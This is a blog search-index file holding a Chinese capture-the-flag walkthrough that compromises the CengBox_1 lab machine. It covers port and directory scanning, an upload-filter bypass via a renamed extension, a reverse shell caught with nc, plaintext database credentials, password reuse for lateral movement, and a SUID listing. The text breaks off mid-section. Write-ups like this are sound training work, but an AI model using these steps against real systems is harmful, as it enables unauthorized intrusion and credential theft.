<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CengBox_1 靶机</title>
    <link href="/2023/10/1ef2ffe7f741.html"/>
    <url>/2023/10/1ef2ffe7f741.html</url>
    
    <content type="html"><![CDATA[<h1 id="CengBox-1-靶机"><a href="#CengBox-1-靶机" class="headerlink" title="CengBox_1 靶机"></a>CengBox_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.1.102 <br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br></code></pre></td></tr></table></figure><p>开放了 22, 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.1.102<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a9:cc:28:f3:8c:f5:0e:3f:5a:ed:13:f3:ad:53:13:9b (RSA)<br>|   256 f7:3a:a3:ff:a1:f7:e5:1b:1e:6f:58:5f:c7:02:55:9b (ECDSA)<br>|_  256 f0:<span class="hljs-built_in">dd</span>:2e:1d:3d:0a:e8:c1:5f:52:7c:55:2c:dc:1e:ef (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: CEng Company<br><br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.1.102 <br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">|_      http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-fileupload-exploiter: <br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br></code></pre></td></tr></table></figure><p>漏洞脚本扫描没找到有价值的信息。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo dirsearch -u http://192.168.1.102       <br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>[07:31:24] 301 -  311B  - /js  -&gt;  http://192.168.1.102/js/                                               <br>[07:31:39] 301 -  312B  - /css  -&gt;  http://192.168.1.102/css/               <br>[07:31:42] 200 -    3KB - /gulpfile.js                                      <br>[07:31:43] 301 -  312B  - /img  -&gt;  http://192.168.1.102/img/               <br>[07:31:43] 200 -    6KB - /index.php                                        <br>[07:31:43] 200 -    6KB - /index.php/login/                                 <br>[07:31:44] 403 -  278B  - /js/                                              <br>[07:31:45] 301 -  320B  - /masteradmin  -&gt;  http://192.168.1.102/masteradmin/<br>[07:31:52] 403 -  278B  - /server-status                                    <br>[07:31:52] 403 -  278B  - /server-status/                                   <br>[07:31:56] 301 -  316B  - /uploads  -&gt;  http://192.168.1.102/uploads/       <br>[07:31:56] 403 -  278B  - /uploads/                                         <br>[07:31:57] 403 -  278B  - /vendor/<br></code></pre></td></tr></table></figure><p>一些感兴趣的目录，但是都是 403 ：<code>img</code>, <code>masteradmin</code>, <code>uploads</code> 先看看 web 界面吧</p><p><img src="/pic/21fa37cbf89b74559f4cce9744413acb_MD5.png"></p><p>收集到一些信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">web</span> title:CEng Company<br>cengover<span class="hljs-variable">@cengbox</span>.com<br>+<span class="hljs-number">1</span> (<span class="hljs-number">555</span>) <span class="hljs-number">902</span>-<span class="hljs-number">8832</span><br><span class="hljs-number">1142</span> Baker Street, London UK<br></code></pre></td></tr></table></figure><p>但还是没找到可攻击的入口，尝试对二级目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo dirsearch -u http://192.168.1.102/masteradmin/<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>[07:43:49] 301 -  324B  - /masteradmin/css  -&gt;  http://192.168.1.102/masteradmin/css/<br>[07:43:50] 200 -    0B  - /masteradmin/db.php                               <br>[07:43:52] 301 -  326B  - /masteradmin/fonts  -&gt;  http://192.168.1.102/masteradmin/fonts/<br>[07:43:53] 301 -  327B  - /masteradmin/images  -&gt;  http://192.168.1.102/masteradmin/images/<br>[07:43:53] 403 -  278B  - /masteradmin/images/                              <br>[07:43:55] 403 -  278B  - /masteradmin/js/                                  <br>[07:43:56] 200 -    5KB - /masteradmin/login.php                            <br>[07:44:09] 200 -    1KB - /masteradmin/upload.php                           <br>[07:44:10] 403 -  278B  - /masteradmin/vendor/<br></code></pre></td></tr></table></figure><p>发现了一些可以访问的有价值文件</p><p><img src="/pic/324c45fc171a01ff3ef319af2855b42e_MD5.png"></p><p>登录界面网页源码中没有隐藏信息</p><h2 id="构造请求包上传文件"><a href="#构造请求包上传文件" class="headerlink" title="构造请求包上传文件"></a>构造请求包上传文件</h2><p><code>upload.php</code> 访问会跳转到登录界面，burp 看看历史记录</p><p><img src="/pic/411e689968b61394bb5f2360c9745020_MD5.png"></p><p>被 js 跳转到了 login.php 但是往下翻响应包发现了有趣的事情</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>= <span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">multiple</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;image&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Drag your files here or click in this area.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Upload<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>虽然跳转了，但是响应包中还是有上传入口的代码，也就是说我们是可以正常访问 <code>upload.php</code> 的，自己构造一下包，使用 burp 来发送请求包。为了构造请求包方便，我将上个网页代码 form 框中的 action 值设置为了远程目标主机，然后本地写入了个 html，这样我可以直接点击上传然后抓包就行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">action=<span class="hljs-string">&quot;http://192.168.1.102/masteradmin/upload.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/pic/452c0b98a0fff1da0283f45032318cd5_MD5.png"></p><p>响应包提示 <code>extension not allowed, please choose a CENG file.</code></p><p>尝试更改 Content-Type，无效，卡了一会</p><p>尝试更改文件名后缀</p><p><img src="/pic/9267820a785e11954ad80e8fa100e040_MD5.png"></p><p>成功，我们在之前目录爆破的时候，发现过 uploads 目录，虽然是 403</p><p>这里我们提前开启监听，然后访问 <a href="http://192.168.1.102/uploads/1.ceng%60">http://192.168.1.102/uploads/1.ceng`</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/CengBox]<br>└─$ sudo nc -lvnp 443                                    <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.1.101] from (UNKNOWN) [192.168.1.102] 56028<br>Linux cengbox 4.4.0-177-generic <span class="hljs-comment">#207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br> 15:15:19 up 57 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.01<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:f8:53:a5 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.1.102/24 brd 192.168.1.255 scope global enp0s3</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fef8:53a5/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux cengbox 4.4.0-177-generic #207-Ubuntu SMP Mon Mar 16 01:16:10 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">$ which python2</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@cengbox:/$</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="查看数据库配置文件"><a href="#查看数据库配置文件" class="headerlink" title="查看数据库配置文件"></a>查看数据库配置文件</h3><p>查看网站根目录文件，因为有登录界面，所以顺便找一找数据库配置文件，看看能不能获取到数据库明文密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cengbox:/var/www/html$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 52K<br> 922200 drwxr-xr-x 9 www-data www-data 4.0K Apr 29  2020 .<br> 922199 drwxr-xr-x 3 root     root     4.0K Apr 25  2020 ..<br> 916283 -rw-r--r-- 1 www-data www-data   97 Apr 29  2020 .htaccess<br>1050978 drwxr-xr-x 2 www-data www-data 4.0K Apr 26  2020 css<br>1051150 -rw-r--r-- 1 www-data www-data 3.5K Sep 17  2019 gulpfile.js<br>1050981 drwxr-xr-x 2 www-data www-data 4.0K Apr 26  2020 img<br> 916246 -rw-r--r-- 1 www-data www-data 5.7K Apr 28  2020 index.php<br>1050984 drwxr-xr-x 2 www-data www-data 4.0K Apr 26  2020 js<br> 915850 drwxr-xr-x 7 www-data www-data 4.0K Apr 29  2020 masteradmin<br>1050987 drwxr-xr-x 2 www-data www-data 4.0K Apr 26  2020 scss<br>   2691 drwxr-xr-x 2 www-data www-data 4.0K Oct 16 15:15 uploads<br> 925140 drwxr-xr-x 6 www-data www-data 4.0K Apr 26  2020 vendor<br>www-data@cengbox:/var/www/html$ <span class="hljs-built_in">cd</span> masteradmin<br><span class="hljs-built_in">cd</span> masteradmin<br>www-data@cengbox:/var/www/html/masteradmin$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 44K<br> 915850 drwxr-xr-x  7 www-data www-data 4.0K Apr 29  2020 .<br> 922200 drwxr-xr-x  9 www-data www-data 4.0K Apr 29  2020 ..<br>1055493 drwxr-xr-x  2 www-data www-data 4.0K Apr 26  2020 css<br> 916187 -rw-r--r--  1 www-data www-data  311 Apr 27  2020 db.php<br> 915922 drwxr-xr-x  5 www-data www-data 4.0K Apr 26  2020 fonts<br> 915857 drwxr-xr-x  3 www-data www-data 4.0K Apr 26  2020 images<br>   2671 drwxr-xr-x  2 www-data www-data 4.0K Apr 26  2020 js<br> 916415 -rw-r--r--  1 www-data www-data 5.7K Apr 28  2020 login.php<br> 916189 -rw-r--r--  1 www-data www-data 2.2K Apr 29  2020 upload.php<br> 915876 drwxr-xr-x 10 www-data www-data 4.0K Apr 26  2020 vendor<br>www-data@cengbox:/var/www/html/masteradmin$ <span class="hljs-built_in">cat</span> db.php<br><span class="hljs-built_in">cat</span> db.php<br>&lt;?php<br><span class="hljs-variable">$serverName</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;SuperS3cR3TPassw0rd1!&quot;</span>;<br><span class="hljs-variable">$dbName</span> = <span class="hljs-string">&quot;cengbox&quot;</span>;<br>//Create Connection<br><span class="hljs-variable">$conn</span> = new mysqli(<span class="hljs-variable">$serverName</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>,<span class="hljs-variable">$dbName</span>);<br><br>//Check Connection<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;connect_error)&#123;<br>        die(<span class="hljs-string">&quot;Connection Failed: &quot;</span>.<span class="hljs-variable">$conn</span>-&gt;connect_error);<br>&#125; <span class="hljs-keyword">else</span> &#123; &#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>拿到了数据库密码 <code>SuperS3cR3TPassw0rd1!</code> 尝试使用此密码切换登录到其他用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cengbox:/var/www/html/masteradmin$ <span class="hljs-built_in">ls</span> -liah /home<br><span class="hljs-built_in">ls</span> -liah /home<br>total 16K<br>654081 drwxr-xr-x  4 root     root     4.0K Apr 25  2020 .<br>     2 drwxr-xr-x 23 root     root     4.0K Apr 26  2020 ..<br>793691 drwxr-xr-x  3 root     root     4.0K Apr 25  2020 .ecryptfs<br>793690 dr-x------  2 cengover cengover 4.0K Apr 25  2020 cengover<br>www-data@cengbox:/var/www/html/masteradmin$ su cengover<br>su cengover<br>Password: SuperS3cR3TPassw0rd1!<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>登录数据库看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cengbox:/var/www/html/masteradmin$ mysql -uroot -p<br>mysql -uroot -p<br>Enter password: SuperS3cR3TPassw0rd1!<br><br>mysql&gt; <span class="hljs-keyword">select</span> * from admin;<br><span class="hljs-keyword">select</span> * from admin;<br>+----+-------------+---------------+<br>| <span class="hljs-built_in">id</span> | username    | password      |<br>+----+-------------+---------------+<br>|  1 | masteradmin | C3ng0v3R00T1! |<br>+----+-------------+---------------+<br></code></pre></td></tr></table></figure><p>发现数据库中保存了明文密码</p><h3 id="密码重用切换登录"><a href="#密码重用切换登录" class="headerlink" title="密码重用切换登录"></a>密码重用切换登录</h3><p>使用此密码切换登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@cengbox:/var/www/html/masteradmin$ ps aux | grep mysql<br>ps aux | grep mysql<br>mysql     1137  0.2 14.6 1116336 148404 ?      Ssl  14:17   0:08 /usr/sbin/mysqld<br>www-data  2000  0.0  0.0  11280  1008 pts/0    S+   15:21   0:00 grep mysql<br>www-data@cengbox:/var/www/html/masteradmin$ su cengover<br>su cengover<br>Password: C3ng0v3R00T1!<br></code></pre></td></tr></table></figure><p>登录成功，基础的信息收集，查看用户 sudo 权限和家目录文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/var/www/html/masteradmin$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> cengover: C3ng0v3R00T1!<br><br>Sorry, user cengover may not run sudo on cengbox.<br>cengover@cengbox:/var/www/html/masteradmin$ <span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">cd</span> ~<br>cengover@cengbox:~$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 116K<br>793696 drwx------ 4 cengover cengover 4.0K Apr 29  2020 .<br>654081 drwxr-xr-x 4 root     root     4.0K Apr 25  2020 ..<br>785396 -rw------- 1 cengover cengover    0 Apr 29  2020 .bash_history<br>793703 -rw-r--r-- 1 cengover cengover  220 Apr 25  2020 .bash_logout<br>793704 -rw-r--r-- 1 cengover cengover 3.7K Apr 25  2020 .bashrc<br>793688 drwx------ 2 cengover cengover 4.0K Apr 25  2020 .cache<br>793701 lrwxrwxrwx 1 cengover cengover   34 Apr 25  2020 .ecryptfs -&gt; /home/.ecryptfs/cengover/.ecryptfs<br>785233 -rw------- 1 cengover cengover  478 Apr 27  2020 .mysql_history<br>785217 drwxrwxr-x 2 cengover cengover 4.0K Apr 26  2020 .nano<br>793702 lrwxrwxrwx 1 cengover cengover   33 Apr 25  2020 .Private -&gt; /home/.ecryptfs/cengover/.Private<br>793705 -rw-r--r-- 1 cengover cengover  655 Apr 25  2020 .profile<br>793707 -rw-r--r-- 1 cengover cengover    0 Apr 25  2020 .sudo_as_admin_successful<br>785383 -rw-rw-r-- 1 cengover cengover   33 Apr 29  2020 user.txt<br>785231 -rw------- 1 cengover cengover 7.0K Apr 29  2020 .viminfo<br>cengover@cengbox:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>8f7f6471e2e869f029a75c5de601d5e0<br></code></pre></td></tr></table></figure><p>看看 SUID 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/home/cengover$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>&lt;yptfs/cengover/.Private$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null        <br>  1046604     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /bin/ping6<br>  1046620     40 -rwsr-xr-x   1 root     root        40128 May 17  2017 /bin/su<br>  1046589     40 -rwsr-xr-x   1 root     root        40152 May 16  2018 /bin/mount<br>  1046603     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /bin/ping<br>  1046638     28 -rwsr-xr-x   1 root     root        27608 May 16  2018 /bin/umount<br>  1050914     32 -rwsr-xr-x   1 root     root        30800 Jul 12  2016 /bin/fusermount<br>   923699     20 -rwsr-xr-x   1 root     root        19024 Jul 13  2016 /sbin/mount.ecryptfs_private<br>   406290     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 15  2016 /usr/bin/at<br>   405770     36 -rwsr-xr-x   1 root     root        32944 May 17  2017 /usr/bin/newgidmap<br>   392482     52 -rwsr-xr-x   1 root     root        49584 May 17  2017 /usr/bin/chfn<br>   392622     56 -rwsr-xr-x   1 root     root        54256 May 17  2017 /usr/bin/passwd<br>   392545     76 -rwsr-xr-x   1 root     root        75304 May 17  2017 /usr/bin/gpasswd<br>   410350     24 -rwsr-xr-x   1 root     root        23376 Mar 27  2019 /usr/bin/pkexec<br>   405769     36 -rwsr-xr-x   1 root     root        32944 May 17  2017 /usr/bin/newuidmap<br>   393725    136 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /usr/bin/sudo<br>   392611     40 -rwsr-xr-x   1 root     root        39904 May 17  2017 /usr/bin/newgrp<br>   392484     40 -rwsr-xr-x   1 root     root        40432 May 17  2017 /usr/bin/chsh<br>   785419     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   410362    100 -rwsr-sr-x   1 root     root          98472 Mar 18  2019 /usr/lib/snapd/snap-confine<br>   405752     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>   410346     16 -rwsr-xr-x   1 root     root          14864 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br>   392808     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device<br>   393903    420 -rwsr-xr-x   1 root     root         428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure><p>尝试使用之前获取的口令切换为 root 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">cengover@cengbox:/$ su<br>su<br>Password: SuperS3cR3TPassw0rd1!<br><br>su: Authentication failure<br>cengover@cengbox:/$ su<br>su<br>Password: C3ng0v3R00T1!<br><br>su: Authentication failure<br></code></pre></td></tr></table></figure><p>尝试看看敏感文件权限和定时任务文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 